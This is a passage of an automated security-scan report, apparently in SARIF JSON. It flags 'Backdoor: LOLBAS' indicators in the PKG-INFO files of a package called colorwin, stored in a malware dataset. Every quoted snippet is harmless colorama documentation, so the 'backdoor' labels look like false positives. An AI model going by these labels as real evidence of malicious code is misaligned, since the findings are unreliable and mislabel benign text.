                      "text": "the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\r\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\r\n\r\nIf you wish Colorama's Fore, Back and Style constants were more capable,\r\nthen consider using one of the above highly capable libraries to generate\r\ncolors, etc, and use Colorama just for its primary purpose: to convert\r\nthose ANSI sequences to also work on Windows:\r\n",
                      "markdown": "`the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\r\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\r\n\r\nIf you wish Colorama's Fore, Back and Style constants were more capable,\r\nthen consider using one of the above highly capable libraries to generate\r\ncolors, etc, and use Colorama just for its primary purpose: to convert\r\nthose ANSI sequences to also work on Windows:\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 28,
                  "endLine": 164,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\r\n.. code-block:: python\r\n\r\n    print('\\033[31m' + 'some red text')\r\n    print('\\033[39m') # and reset to default color\r\n\r\n...or, Colorama can be used in conjunction with existing ANSI libraries\r\n",
                    "rendered": {
                      "text": "\r\n.. code-block:: python\r\n\r\n    print('\\033[31m' + 'some red text')\r\n    print('\\033[39m') # and reset to default color\r\n\r\n...or, Colorama can be used in conjunction with existing ANSI libraries\r\n",
                      "markdown": "`\r\n.. code-block:: python\r\n\r\n    print('\\033[31m' + 'some red text')\r\n    print('\\033[39m') # and reset to default color\r\n\r\n...or, Colorama can be used in conjunction with existing ANSI libraries\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 154,
                  "startColumn": 26,
                  "endLine": 154,
                  "endColumn": 31,
                  "snippet": {
                    "text": ".. code-block:: python\r\n\r\n    from colorama import Fore, Back, Style\r\n    print(Fore.RED + 'some red text')\r\n    print(Back.GREEN + 'and with a green background')\r\n    print(Style.DIM + 'and in dim text')\r\n    print(Style.RESET_ALL)\r\n",
                    "rendered": {
                      "text": ".. code-block:: python\r\n\r\n    from colorama import Fore, Back, Style\r\n    print(Fore.RED + 'some red text')\r\n    print(Back.GREEN + 'and with a green background')\r\n    print(Style.DIM + 'and in dim text')\r\n    print(Style.RESET_ALL)\r\n",
                      "markdown": "`.. code-block:: python\r\n\r\n    from colorama import Fore, Back, Style\r\n    print(Fore.RED + 'some red text')\r\n    print(Back.GREEN + 'and with a green background')\r\n    print(Style.DIM + 'and in dim text')\r\n    print(Style.RESET_ALL)\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 3,
                  "endLine": 70,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n    conda install -c anaconda colorama\r\n\r\n",
                    "rendered": {
                      "text": "\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n    conda install -c anaconda colorama\r\n\r\n",
                      "markdown": "`\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n    conda install -c anaconda colorama\r\n\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 15,
                  "endLine": 68,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n",
                    "rendered": {
                      "text": "\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n",
                      "markdown": "`\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 6,
                  "endLine": 58,
                  "endColumn": 12,
                  "snippet": {
                    "text": "`Github for source <https://github.com/tartley/colorama>`_ |\r\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\r\n\r\nIf you find Colorama useful, please |donate| to the authors. Thank you!\r\n\r\n\r\nInstallation\r\n",
                    "rendered": {
                      "text": "`Github for source <https://github.com/tartley/colorama>`_ |\r\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\r\n\r\nIf you find Colorama useful, please |donate| to the authors. Thank you!\r\n\r\n\r\nInstallation\r\n",
                      "markdown": "``Github for source <https://github.com/tartley/colorama>`_ |\r\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\r\n\r\nIf you find Colorama useful, please |donate| to the authors. Thank you!\r\n\r\n\r\nInstallation\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 391,
                  "startColumn": 7,
                  "endLine": 391,
                  "endColumn": 11,
                  "snippet": {
                    "text": "* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\r\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\r\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\r\n* Jesse at Empty Square for submitting a fix for examples in the README.\r\n* User 'jamessp', an observant documentation fix for cursor positioning.\r\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\r\n  fix.\r\n",
                    "rendered": {
                      "text": "* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\r\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\r\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\r\n* Jesse at Empty Square for submitting a fix for examples in the README.\r\n* User 'jamessp', an observant documentation fix for cursor positioning.\r\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\r\n  fix.\r\n",
                      "markdown": "`* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\r\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\r\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\r\n* Jesse at Empty Square for submitting a fix for examples in the README.\r\n* User 'jamessp', an observant documentation fix for cursor positioning.\r\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\r\n  fix.\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 305,
                  "startColumn": 37,
                  "endLine": 305,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n    ESC [ n C       # move cursor n characters forward\r\n",
                    "rendered": {
                      "text": "\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n    ESC [ n C       # move cursor n characters forward\r\n",
                      "markdown": "`\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n    ESC [ n C       # move cursor n characters forward\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 304,
                  "startColumn": 37,
                  "endLine": 304,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    ESC [ 49 m      # reset\r\n\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n",
                    "rendered": {
                      "text": "    ESC [ 49 m      # reset\r\n\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n",
                      "markdown": "`    ESC [ 49 m      # reset\r\n\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 217,
                  "startColumn": 11,
                  "endLine": 217,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n    .. code-block:: python\r\n",
                    "rendered": {
                      "text": "\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n    .. code-block:: python\r\n",
                      "markdown": "`\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n    .. code-block:: python\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 15,
                  "endLine": 68,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n",
                    "rendered": {
                      "text": "\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n",
                      "markdown": "`\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 312,
                  "startColumn": 31,
                  "endLine": 312,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n    ESC [ mode K    # clear the line\r\n",
                    "rendered": {
                      "text": "    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n    ESC [ mode K    # clear the line\r\n",
                      "markdown": "`    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n    ESC [ mode K    # clear the line\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 311,
                  "startColumn": 15,
                  "endLine": 311,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    ESC [ n C       # move cursor n characters forward\r\n    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n",
                    "rendered": {
                      "text": "    ESC [ n C       # move cursor n characters forward\r\n    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n",
                      "markdown": "`    ESC [ n C       # move cursor n characters forward\r\n    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 294,
                  "startColumn": 21,
                  "endLine": 294,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\r\n    # BACKGROUND\r\n    ESC [ 40 m      # black\r\n    ESC [ 41 m      # red\r\n    ESC [ 42 m      # green\r\n    ESC [ 43 m      # yellow\r\n    ESC [ 44 m      # blue\r\n",
                    "rendered": {
                      "text": "\r\n    # BACKGROUND\r\n    ESC [ 40 m      # black\r\n    ESC [ 41 m      # red\r\n    ESC [ 42 m      # green\r\n    ESC [ 43 m      # yellow\r\n    ESC [ 44 m      # blue\r\n",
                      "markdown": "`\r\n    # BACKGROUND\r\n    ESC [ 40 m      # black\r\n    ESC [ 41 m      # red\r\n    ESC [ 42 m      # green\r\n    ESC [ 43 m      # yellow\r\n    ESC [ 44 m      # blue\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 283,
                  "startColumn": 21,
                  "endLine": 283,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\r\n    # FOREGROUND:\r\n    ESC [ 30 m      # black\r\n    ESC [ 31 m      # red\r\n    ESC [ 32 m      # green\r\n    ESC [ 33 m      # yellow\r\n    ESC [ 34 m      # blue\r\n",
                    "rendered": {
                      "text": "\r\n    # FOREGROUND:\r\n    ESC [ 30 m      # black\r\n    ESC [ 31 m      # red\r\n    ESC [ 32 m      # green\r\n    ESC [ 33 m      # yellow\r\n    ESC [ 34 m      # blue\r\n",
                      "markdown": "`\r\n    # FOREGROUND:\r\n    ESC [ 30 m      # black\r\n    ESC [ 31 m      # red\r\n    ESC [ 32 m      # green\r\n    ESC [ 33 m      # yellow\r\n    ESC [ 34 m      # blue\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 224,
                  "startColumn": 30,
                  "endLine": 224,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\r\n        from colorama import init\r\n        init(autoreset=True)\r\n        print(Fore.RED + 'some red text')\r\n        print('automatically back to default color again')\r\n\r\ninit(strip=None):\r\n",
                    "rendered": {
                      "text": "\r\n        from colorama import init\r\n        init(autoreset=True)\r\n        print(Fore.RED + 'some red text')\r\n        print('automatically back to default color again')\r\n\r\ninit(strip=None):\r\n",
                      "markdown": "`\r\n        from colorama import init\r\n        init(autoreset=True)\r\n        print(Fore.RED + 'some red text')\r\n        print('automatically back to default color again')\r\n\r\ninit(strip=None):\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 216,
                  "startColumn": 10,
                  "endLine": 216,
                  "endColumn": 16,
                  "snippet": {
                    "text": "``init()`` accepts some ``**kwargs`` to override default behaviour.\r\n\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n",
                    "rendered": {
                      "text": "``init()`` accepts some ``**kwargs`` to override default behaviour.\r\n\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n",
                      "markdown": "```init()`` accepts some ``**kwargs`` to override default behaviour.\r\n\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 172,
                  "startColumn": 6,
                  "endLine": 172,
                  "endColumn": 12,
                  "snippet": {
                    "text": "the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\r\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\r\n\r\nIf you wish Colorama's Fore, Back and Style constants were more capable,\r\nthen consider using one of the above highly capable libraries to generate\r\ncolors, etc, and use Colorama just for its primary purpose: to convert\r\nthose ANSI sequences to also work on Windows:\r\n",
                    "rendered": {
                      "text": "the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\r\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\r\n\r\nIf you wish Colorama's Fore, Back and Style constants were more capable,\r\nthen consider using one of the above highly capable libraries to generate\r\ncolors, etc, and use Colorama just for its primary purpose: to convert\r\nthose ANSI sequences to also work on Windows:\r\n",
                      "markdown": "`the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\r\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\r\n\r\nIf you wish Colorama's Fore, Back and Style constants were more capable,\r\nthen consider using one of the above highly capable libraries to generate\r\ncolors, etc, and use Colorama just for its primary purpose: to convert\r\nthose ANSI sequences to also work on Windows:\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 28,
                  "endLine": 164,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\r\n.. code-block:: python\r\n\r\n    print('\\033[31m' + 'some red text')\r\n    print('\\033[39m') # and reset to default color\r\n\r\n...or, Colorama can be used in conjunction with existing ANSI libraries\r\n",
                    "rendered": {
                      "text": "\r\n.. code-block:: python\r\n\r\n    print('\\033[31m' + 'some red text')\r\n    print('\\033[39m') # and reset to default color\r\n\r\n...or, Colorama can be used in conjunction with existing ANSI libraries\r\n",
                      "markdown": "`\r\n.. code-block:: python\r\n\r\n    print('\\033[31m' + 'some red text')\r\n    print('\\033[39m') # and reset to default color\r\n\r\n...or, Colorama can be used in conjunction with existing ANSI libraries\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 154,
                  "startColumn": 26,
                  "endLine": 154,
                  "endColumn": 31,
                  "snippet": {
                    "text": ".. code-block:: python\r\n\r\n    from colorama import Fore, Back, Style\r\n    print(Fore.RED + 'some red text')\r\n    print(Back.GREEN + 'and with a green background')\r\n    print(Style.DIM + 'and in dim text')\r\n    print(Style.RESET_ALL)\r\n",
                    "rendered": {
                      "text": ".. code-block:: python\r\n\r\n    from colorama import Fore, Back, Style\r\n    print(Fore.RED + 'some red text')\r\n    print(Back.GREEN + 'and with a green background')\r\n    print(Style.DIM + 'and in dim text')\r\n    print(Style.RESET_ALL)\r\n",
                      "markdown": "`.. code-block:: python\r\n\r\n    from colorama import Fore, Back, Style\r\n    print(Fore.RED + 'some red text')\r\n    print(Back.GREEN + 'and with a green background')\r\n    print(Style.DIM + 'and in dim text')\r\n    print(Style.RESET_ALL)\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 3,
                  "endLine": 70,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n    conda install -c anaconda colorama\r\n\r\n",
                    "rendered": {
                      "text": "\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n    conda install -c anaconda colorama\r\n\r\n",
                      "markdown": "`\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n    conda install -c anaconda colorama\r\n\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 15,
                  "endLine": 68,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n",
                    "rendered": {
                      "text": "\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n",
                      "markdown": "`\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/PKG-INFO"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 6,
                  "endLine": 58,
                  "endColumn": 12,
                  "snippet": {
